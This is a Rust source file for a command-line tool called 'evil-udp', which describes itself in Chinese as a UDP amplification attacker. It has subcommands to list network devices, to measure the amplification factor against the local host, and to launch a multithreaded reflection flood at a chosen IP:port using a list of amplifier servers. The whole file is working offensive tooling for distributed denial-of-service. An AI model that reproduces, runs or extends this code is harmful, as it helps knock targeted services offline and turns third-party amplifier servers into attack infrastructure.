mod lib;


use std::io::Write;
use std::process::exit;
use clap::{Arg, ArgMatches, Command};
use colorful::Colorful;


fn cli() -> Command<'static> {
    Command::new("evil-udp".bold().to_string())
        .about("一个基于rust的udp放大攻击器")
        .author("lihe07(Github) <li@imlihe.com>")
        .subcommand_required(true)
        .arg_required_else_help(true)
        .allow_external_subcommands(true)
        .allow_invalid_utf8_for_external_subcommands(true)
        .subcommand(
            Command::new("devices")
                .about("显示所有可用的设备")
        )
        .subcommand(
            Command::new("test")
                .about("攻击本机，测试放大器是否可用。计算放大倍率及网络吞吐量")
                .arg(
                    Arg::new("amplifiers")
                        .help("放大器列表文件")
                        .required(true)
                        .value_name("AMPLIFIERS")
                        .short('a')
                        .long("amplifiers")
                )
                .arg(
                    Arg::new("device")
                        .help("攻击使用的设备序号，如不指定则使用系统默认设备")
                        .required(false)
                        .value_name("DEVICE")
                        .short('d')
                        .long("device")
                )
                .arg(
                    Arg::new("port")
                        .help("攻击使用的端口，如不指定则使用随机可用端口")
                        .required(false)
                        .value_name("PORT")
                        .short('p')
                        .long("port")
                )
                .arg(
                    Arg::new("threshold")
                        .help("终止阈值，格式为数字+单位，如：100M，1G，1K 默认为1K")
                        .required(false)
                        .value_name("THRESHOLD")
                        .short('t')
                        .long("threshold")
                )
                .arg(
                    Arg::new("interval")
                        .help("单个线程两次攻击间隔，单位为毫秒，默认为100")
                        .required(false)
                        .value_name("INTERVAL")
                        .short('i')
                        .long("interval")
                )
                .arg(
                    Arg::new("threads")
                        .help("攻击线程数，默认为逻辑CPU数量")
                        .required(false)
                        .value_name("THREADS")
                        .short('n')
                        .long("threads")
                )
        )
        .subcommand(
            Command::new("attack")
                .about("攻击一台设备，需指定目标IP和端口号")
                .arg(
                    Arg::new("target")
                        .help("目标IP:PORT")
                        .required(true)
                        .value_name("TARGET")
                )
                .arg(
                    Arg::new("amplifiers")
                        .help("放大器列表文件")
                        .required(true)
                        .value_name("AMPLIFIERS")
                        .short('a')
                        .long("amplifiers")
                )
                .arg(
                    Arg::new("device")
                        .help("攻击使用的设备序号，如不指定则使用系统默认设备")
                        .required(false)
                        .value_name("DEVICE")
                        .short('d')
                        .long("device")
                )
                .arg(
                    Arg::new("threshold")
                        .help("终止阈值，格式为数字+单位，如：100M，1G，1K 默认为1K")
                        .required(false)
                        .value_name("THRESHOLD")
                        .short('t')
                        .long("threshold")
                )
                .arg(
                    Arg::new("interval")
                        .help("单个线程两次攻击间隔，单位为毫秒，默认为100")
                        .required(false)
                        .value_name("INTERVAL")
                        .short('i')
                        .long("interval")
                )
                .arg(
                    Arg::new("threads")
                        .help("攻击线程数，默认为逻辑CPU数量")
                        .required(false)
                        .value_name("THREADS")
                        .short('n')
                        .long("threads")
                )

        )
}

fn devices(_args: &ArgMatches) {
    let mut index = 0;
    for dev in lib::available_devices() {
        println!("{} - {} ({})", index.to_string().bold().blue(), dev.description.bold(), dev.name);
        index += 1;
    }
    if index == 0 {
        println!("{}没有可用的网络设备", "Warning: ".bold().yellow());
    }
}

fn test(args: &ArgMatches) {
    let time0 = chrono::Utc::now().timestamp();
    let mut time1 = 0;

    let amplifiers_config = args.value_of("amplifiers").unwrap();
    let amplifiers = lib::get_amplifiers_from_file(amplifiers_config.to_string());
    let lib = rawsock::open_best_library().unwrap();
    // 获取设备
    let device = lib::get_configured_device_name(&args);
    let port = args.value_of("port").unwrap_or(&lib::get_available_port().to_string()).parse::<u16>().unwrap();
    let threshold = args.value_of("threshold").unwrap_or("1K").to_string();
    let threshold = lib::parse_threshold(threshold);
    let interval = args.value_of("interval").unwrap_or("100").parse::<u64>().unwrap();

    let (halt_tx, halt_rx) = crossbeam::channel::unbounded(); // 停止信号
    let (stats_tx, stats_rx) = crossbeam::channel::unbounded(); // 统计信息
    let net_info = lib::get_net_info(device.to_owned());
    let local_ip = lib::string_ip_to_array(net_info.local_ip.to_owned());

    let thread_num = num_cpus::get(); // 线程数为当前设备逻辑CPU数
    let thread_num = args.value_of("threads").unwrap_or(&thread_num.to_string()).parse::<usize>().unwrap();

    let threads = lib::attack_multithreaded(
        format!("{}:{}", net_info.local_ip, port),
        device.to_owned(),
        net_info.to_owned(),
        amplifiers,
        interval,
        thread_num,
        halt_rx.clone(),
        stats_tx,
    ); // 启动多线程攻击 实际线程数为线程数减1
    let halt_tx_clone = halt_tx.clone();
    ctrlc::set_handler(move || {
        println!("\n{}立即终止", "Warning: ".bold().yellow());
        for _ in 0..thread_num {
            halt_tx_clone.send(true).unwrap();
        }
    }).unwrap();
    let mut interface = lib.open_interface(device.as_str()).unwrap();
    let mut sent_size = 0;
    let mut received_size = 0;

    let mut timeout = 0;
    let mut time_remaining = 0;

    let mut last_measure = (chrono::Utc::now().timestamp(), sent_size, received_size);

    loop {
        if let Ok(size) = stats_rx.try_recv() {
            sent_size += size;
        }
        if let Ok(halt_main) = halt_rx.try_recv() {
            if halt_main {
                // 立即退出
                break;
            } else {
                halt_tx.send(false).unwrap();
            }
        }
        if timeout != 0 && chrono::Utc::now().timestamp() >= timeout {
            // 超时退出
            println!("{}统计结束", "Info: ".bold().green());
            break;
        } else if timeout != 0 {
            if time_remaining != timeout - chrono::Utc::now().timestamp() {
                // 更新剩余时间
                time_remaining = timeout - chrono::Utc::now().timestamp();
                println!("{}剩余时间 {}s", "Info: ".bold().green(), time_remaining);
            }
        }

        let packet = interface.receive();
        if packet.is_err() {
            // println!("\n{}接收到错误包", "Warning: ".bold().yellow());
            continue;
        }
        let packet = packet.unwrap();
        // 如果是UDP包 目标地址是本机 并且端口是目标端口 则认为是成功攻击的
        if let Ok((_, eth_payload)) = etherparse::Ethernet2Header::from_slice(packet.as_ref()) {
            if let Ok((ip_header, ip_payload)) = etherparse::Ipv4Header::from_slice(eth_payload) {
                if let Ok(value) = etherparse::UdpHeaderSlice::from_slice(ip_payload) {
                    if ip_header.destination == local_ip && value.destination_port() == port {
                        received_size += packet.len();
                    }
                }
            }
        }


        if sent_size >= threshold && timeout == 0 {
            println!("{}发送停止信号...", "Warning: ".bold().yellow());
            for _ in 0..thread_num {
                halt_tx.send(false).unwrap();
            }
            time1 = chrono::Utc::now().timestamp();

            // 等待10秒后统计结果
            println!("{}10秒后统计结果...", "Warning: ".bold().yellow());
            timeout = chrono::Utc::now().timestamp() + 10;
            continue;
        }
        if (chrono::Utc::now().timestamp() - last_measure.0) > 1 && timeout == 0 {
            print!("\r{}发包速率: {}/s 总计发送: {} 收包速率: {}/s 总计接收: {}", "Info: ".bold().green(),
                   lib::bytes_with_unit(sent_size - last_measure.1),
                   lib::bytes_with_unit(sent_size),
                   lib::bytes_with_unit(received_size - last_measure.2),
                   lib::bytes_with_unit(received_size)
            );
            std::io::stdout().flush().unwrap();
            last_measure = (chrono::Utc::now().timestamp(), sent_size, received_size);
        }
    }
    for thread in threads {
        if let Err(_) = thread.join() {
            println!("{}攻击线程提前终止", "Warning: ".bold().yellow());
        }
    }
    if time1 == 0 {
        time1 = chrono::Utc::now().timestamp();
    }
    println!("{} {} {}", "=====", "统计结果".bold().green(), "=====");
    println!(" - {}: {}:{}", "攻击目标".blue(), net_info.local_ip, port);
    println!(" - {}: {}", "使用设备".blue(), device);
    println!(" - {}: {}s", "攻击持续时间".blue(), time1 - time0);
    println!(" - {}: {}", "总计发送".blue(), lib::bytes_with_unit(sent_size));
    println!(" - {}: {}", "总计接收".blue(), lib::bytes_with_unit(received_size));
    println!(" - {}: {}", "放大率".blue(), received_size as f64 / sent_size as f64);
}

fn attack(args: &ArgMatches) {
    let time0 = chrono::Utc::now().timestamp();

    let amplifiers_config = args.value_of("amplifiers").unwrap();
    let amplifiers = lib::get_amplifiers_from_file(amplifiers_config.to_string());
    // 获取设备
    let device = lib::get_configured_device_name(&args);
    let thread_num = num_cpus::get(); // 线程数为当前设备逻辑CPU数
    let thread_num = args.value_of("threads").unwrap_or(&thread_num.to_string()).parse::<usize>().unwrap();
    let threshold = args.value_of("threshold").unwrap_or("1K").to_string();
    let threshold = lib::parse_threshold(threshold);
    let interval = args.value_of("interval").unwrap_or("100").parse::<u64>().unwrap();

    let target = args.value_of("target").unwrap().to_string();
    let net_info = lib::get_net_info(device.to_owned());

    let (halt_tx, halt_rx) = crossbeam::channel::unbounded(); // 停止信号
    let (stat_tx, stat_rx) = crossbeam::channel::unbounded(); // 统计信号

    let threads = lib::attack_multithreaded(
        target.to_owned(),
        device.to_owned(),
        net_info.to_owned(),
        amplifiers,
        interval,
        thread_num,
        halt_rx.clone(),
        stat_tx,
    );
    let mut sent_size = 0;

    let halt_tx_clone = halt_tx.clone();
    ctrlc::set_handler(move || {
        println!("\n{}立即终止", "Warning: ".bold().yellow());
        for _ in 0..(thread_num + 1) {
            halt_tx_clone.send(true).unwrap();
        }
    }).unwrap();

    let mut last_mesure = (chrono::Utc::now().timestamp(), sent_size);
    loop {
        if let Ok(halt_main) = halt_rx.try_recv() {
            if halt_main {
                break;
            }
        }
        if let Ok(stat) = stat_rx.try_recv() {
            sent_size += stat;
        }
        if sent_size >= threshold {
            println!("{}发送停止信号...", "Warning: ".bold().yellow());
            for _ in 0..thread_num {
                halt_tx.send(false).unwrap();
            }
            break;
        }
        if (chrono::Utc::now().timestamp() - last_mesure.0) > 1 {
            print!("\r{}发包速率: {}/s 总计发送: {}", "Info: ".bold().green(), lib::bytes_with_unit(sent_size - last_mesure.1), lib::bytes_with_unit(sent_size));
            std::io::stdout().flush().unwrap();
            last_mesure = (chrono::Utc::now().timestamp(), sent_size);
        }
    }
    for thread in threads {
        if let Err(_) = thread.join() {
            println!("{}攻击线程提前终止", "Warning: ".bold().yellow());
        }
    }
    println!("{} {} {}", "=====", "统计结果".bold().green(), "=====");
    println!(" - {}: {}", "攻击目标".blue(), target);
    println!(" - {}: {}", "使用设备".blue(), device);
    println!(" - {}: {}s", "攻击持续时间".blue(), chrono::Utc::now().timestamp() - time0);
    println!(" - {}: {}", "总计发送".blue(), lib::bytes_with_unit(sent_size));
}


fn main() {
    if let Err(_) = rawsock::open_best_library() {
        println!("{}找不到任何支持的网络库", "Error: ".red().bold());
        println!("程序支持：");
        println!("  - pcap");
        println!("  - wpcap (Windows用户推荐)");
        println!("  - npcap");
        println!("  - pfring");
        exit(1);
    }
    let matches = cli().get_matches();
    // ctrlc::set_handler(|| {
    //     println!("\n\n{}", "用户中断".yellow().bold());
    // }).expect("无法设置退出处理函数");
    match matches.subcommand().unwrap() {
        ("devices", args) => devices(args),
        ("test", args) => test(args),
        ("attack", args) => attack(args),
        (_, _) => {
            println!("{}未知命令", "Error: ".red().bold());
            exit(2);
        }
    }
    // println!("{}", "程序退出".yellow().bold());
}
